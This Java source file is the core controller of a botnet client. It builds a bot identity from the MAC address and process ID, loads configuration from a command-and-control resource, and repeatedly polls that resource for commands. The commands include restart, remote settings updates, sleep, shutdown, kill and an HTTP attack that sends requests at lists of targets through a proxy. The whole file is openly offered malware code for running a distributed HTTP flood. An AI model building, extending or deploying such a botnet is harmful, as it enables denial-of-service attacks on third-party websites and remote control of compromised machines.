/*
  The MIT License (MIT)

  Copyright (c) 2016 Giacomo Marciani and Michele Porretta

  Permission is hereby granted, free of charge, to any person obtaining a copy
  of this software and associated documentation files (the "Software"), to deal
  in the Software without restriction, including without limitation the rights
  to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
  copies of the Software, and to permit persons to whom the Software is
  furnished to do so, subject to the following conditions:


  The above copyright notice and this permission notice shall be included in
  all copies or substantial portions of the Software.


  THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT.  IN NO EVENT SHALL THE
  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN
  THE SOFTWARE.
 */

package com.acmutv.botnet.core;

import com.acmutv.botnet.config.AppConfiguration;
import com.acmutv.botnet.config.AppConfigurationService;
import com.acmutv.botnet.core.attack.HttpAttack;
import com.acmutv.botnet.core.command.BotCommand;
import com.acmutv.botnet.core.command.BotCommandService;
import com.acmutv.botnet.core.exception.BotException;
import com.acmutv.botnet.core.pool.BotPool;
import com.acmutv.botnet.core.state.BotState;
import com.acmutv.botnet.core.target.HttpTarget;
import com.acmutv.botnet.tool.net.HttpMethod;
import com.acmutv.botnet.tool.net.HttpProxy;
import com.acmutv.botnet.tool.reflection.ReflectionManager;
import com.acmutv.botnet.tool.runtime.RuntimeManager;
import com.acmutv.botnet.tool.net.ConnectionManager;
import com.acmutv.botnet.tool.time.Duration;
import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;

import java.beans.IntrospectionException;
import java.io.FileInputStream;
import java.io.FileNotFoundException;
import java.io.IOException;
import java.io.InputStream;
import java.lang.reflect.InvocationTargetException;
import java.net.SocketException;
import java.net.UnknownHostException;
import java.util.HashMap;
import java.util.List;
import java.util.Map;
import java.util.concurrent.TimeUnit;

/**
 * This class realizes the core business logic.
 * @author Giacomo Marciani {@literal <gmarciani@acm.org>}
 * @author Michele Porretta {@literal <mporretta@acm.org>}
 * @since 1.0
 */
public class CoreController {

  private static final Logger LOGGER = LogManager.getLogger(CoreController.class);

  /**
   * The bot ID.
   */
  public static String ID;

  /**
   * The bot state.
   */
  public static BotState STATE;

  /**
   * The bot thread pool.
   */
  private static BotPool POOL;


  /**
   * The bot entry-point.
   * @throws BotException in case of errors during bot life cycle.
   */
  public static void startBot() throws BotException {
    changeState(BotState.INIT);
    boolean alive = true;
    while (alive) {
      switch (STATE) {
        case INIT:
          initializeBot();
          break;

        case JOIN:
          joinBotnet();
          break;

        case COMMAND:
          BotCommand cmd = getNextCommand();
          executeCommands(cmd);
          break;

        case DEAD:
          alive = false;
          break;

        default:
          break;
      }
    }

  }

  /**
   * Executes the state `INIT`.
   * Initializes the bot, giving it an identity.
   * @throws  BotException when errors during initialization.
   */
  public static void initializeBot() throws BotException {
    LOGGER.traceEntry();
    LOGGER.info("Initializing bot...");
    generateId();
    LOGGER.info("Bot correctly initialized with ID={}", ID);
    changeState(BotState.JOIN);
    LOGGER.traceExit();
  }

  /**
   * Executes the state `JOIN`.
   * Establishes a connection with the CC and make the bot join the botnet.
   * @throws  BotException when errors during botnet joining.
   */
  public static void joinBotnet() throws BotException {
    LOGGER.traceEntry();
    final String initResource = AppConfigurationService.getConfigurations().getInitResource();
    LOGGER.info("Connecting to C&C at {}...", initResource);
    try (InputStream in = new FileInputStream(initResource)) {
      LOGGER.info("Loading remote configuration...");
      AppConfigurationService.loadJson(in);
    } catch (FileNotFoundException exc) {
      throw new BotException("Cannot connect to C&C at %s", initResource);
    } catch (IOException exc) {
      LOGGER.warn("Cannot close connection to C&C. Cause: {}", exc.getMessage());
    }
    allocateResources();
    LOGGER.info("Bot is up and running");
    changeState(BotState.COMMAND);
    LOGGER.traceExit();
  }

  /**
   * Executes the state `CMD`.
   * @param command the command to execute.
   * @throws  BotException when errors during `CMD` state.
   */
  public static void executeCommands(final BotCommand command) throws BotException {
    LOGGER.traceEntry("command={}", command);
    LOGGER.info("Received command {} with params={}", command.getScope(), command.getParams());

    switch (command.getScope()) {

      case RESTART:
        final String resource = (String) command.getParams().get("resource");
        restartBot((resource != null) ? resource : AppConfigurationService.getConfigurations().getInitResource());
        break;

      case UPDATE:
        @SuppressWarnings("unchecked")
        final Map<String,String> settings = (Map<String,String>) command.getParams().get("settings");
        updateBot((settings != null) ? settings : new HashMap<>());
        break;

      case SLEEP:
        final Duration sleepTimeout = (Duration) command.getParams().get("timeout");
        sleep((sleepTimeout != null) ? sleepTimeout : new Duration(60, TimeUnit.SECONDS));
        break;

      case SHUTDOWN:
        final Duration shutdownTimeout = (Duration) command.getParams().get("timeout");
        shutdown((shutdownTimeout != null) ? shutdownTimeout : new Duration(60, TimeUnit.SECONDS));
        break;

      case KILL:
        kill();
        break;

      case ATTACK_HTTP:
        final HttpMethod method = (HttpMethod) command.getParams().get("method");
        @SuppressWarnings("unchecked")
        final List<HttpTarget> targets = (List<HttpTarget>) command.getParams().get("targets");
        final HttpProxy proxy = (HttpProxy) command.getParams().get("proxy");
        executeHttpAttack(method, targets, proxy);
        break;

      default:
        break;
    }
    LOGGER.traceExit();
  }



  /**
   * Generates the bot ID [MAC_ADDRESS]-[PID].
   * @throws BotException when bot ID cannot be generated.
   */
  private static void generateId() throws BotException {
    LOGGER.traceEntry();
    final String mac;
    try {
      mac = ConnectionManager.getMAC();
    } catch (UnknownHostException|SocketException exc) {
      throw new BotException("Bot ID cannot be generated. Cause : %s", exc.getMessage());
    }
    final String pid = RuntimeManager.getJvmName();
    ID = String.format("%s-%s", mac, pid);
    LOGGER.traceExit();
  }

  /**
   * Parses a {@link BotCommand} from the resource specified in {@link AppConfiguration}.
   * @return the parsed command; command with scope NONE, in case of error.
   * @throws BotException when command resource is unreachable.
   */
  private static BotCommand getNextCommand() throws BotException {
    LOGGER.traceEntry();
    final String cmdResource = AppConfigurationService.getConfigurations().getCmdResource();
    LOGGER.info("Polling command from {}", cmdResource);
    BotCommand cmd;
    try (InputStream in = new FileInputStream(cmdResource)) {
      cmd = BotCommandService.fromJson(in);
    } catch (IOException exc) {
      throw new BotException("Command resource unreachable. Cause %s", exc.getMessage());
    }

    return LOGGER.traceExit(cmd);
  }

  /**
   * Executes the bot command `RESTART`.
   * @param resource the path to the CC initialization resource.
   */
  private static void restartBot(String resource) throws BotException {
    LOGGER.traceEntry("resource={}", resource);
    LOGGER.info("Restarting bot with resource {}...", resource);
    try {
      try (InputStream in = new FileInputStream(resource)) {
        AppConfigurationService.loadJson(in);
      }
    } catch (IOException exc) {
      throw new BotException("Cannot restart bot. Initialization resource cannot be read. Cause: %s", exc.getMessage());
    }
    LOGGER.traceExit();
  }

  /**
   * Executes the command `UPDATE`.
   * @param settings the settings to load.
   * @throws BotException when malformed settings.
   */
  private static void updateBot(Map<String,String> settings) throws BotException {
    LOGGER.traceEntry("settings={}", settings);
    LOGGER.info("Updating bot settings ...");
    for (Map.Entry<String,String> property : settings.entrySet()) {
      final String k = property.getKey();
      final String v = property.getValue();
      try {
        ReflectionManager.set(AppConfiguration.class,
            AppConfigurationService.getConfigurations(), k, v);
      } catch (IntrospectionException | InvocationTargetException | IllegalAccessException exc) {
        throw new BotException("Aborting settings update. Cannot set property %s to value %s", k, v);
      }
    }
    LOGGER.info("Bot settings updated");
    LOGGER.traceExit();
  }

  /**
   * Executes the command `SLEEP`.
   * @param timeout the time period to sleep.
   */
  private static void sleep(Duration timeout) {
    LOGGER.traceEntry("timeout={}", timeout);
    LOGGER.info("Sleeping (timeout: {} {})...", timeout.getAmount(), timeout.getUnit());
    changeState(BotState.SLEEP);
    POOL.pause(timeout);
    try {
      timeout.getUnit().sleep(timeout.getAmount());
    } catch (InterruptedException exc) {
      LOGGER.trace(exc.getMessage());
    }
    LOGGER.info("Awake");
    changeState(BotState.COMMAND);
    LOGGER.traceExit();
  }


  /**
   * Executes the command `SHUTDOWN`.
   * All resources are released, softly.
   * @param timeout the time to shutdown.
   */
  private static void shutdown(Duration timeout) {
    LOGGER.traceEntry("timeout={}", timeout);
    LOGGER.info("Shutting down the bot (timeout: {} {})...", timeout.getAmount(), timeout.getUnit());
    freeResources(timeout);
    LOGGER.info("Bot shut down");
    changeState(BotState.DEAD);
    LOGGER.traceExit();
  }

  /**
   * Executes the command `KILL`.
   * All resources are released, immediately.
   */
  private static void kill() {
    LOGGER.traceEntry();
    LOGGER.info("Killing the bot...");
    freeResources(null);
    LOGGER.info("Bot killed");
    changeState(BotState.DEAD);
    LOGGER.traceExit();
  }

  public static void executeHttpAttack(HttpMethod method, List<HttpTarget> targets, HttpProxy proxy) {
    LOGGER.traceEntry("method={} targets={} proxy={}", method, targets, proxy);
    LOGGER.info("Scheduling attack...");
    targets.stream().forEach(target -> {
      HttpAttack attacker = new HttpAttack(method, target, proxy);
      POOL.submit(attacker);
    });
    LOGGER.info("Attack scheduled");
    LOGGER.traceExit();
  }

  /**
   * Allocates bot's resources.
   */
  private static void allocateResources() {
    POOL = new BotPool();
  }

  /**
   * Deallocates bot's resources.
   * If timeout is specified, resources are deallocated softly.
   * If timeout is not specified, resources are deallocated immediately.
   * @param timeout the timeout for resources deallocation (null for immediate deallocation).
   */
  private static void freeResources(Duration timeout) {
    LOGGER.traceEntry("timeout={}", timeout);
    if (timeout == null) {
      POOL.kill();
    } else {
      POOL.shutdown(timeout);
    }
    LOGGER.traceExit();
  }

  /**
   * Changes the bot state.
   * @param state the new state.
   */
  private static void changeState(BotState state) {
    LOGGER.traceEntry("state={}", state.getName());
    STATE = state;
  }

}
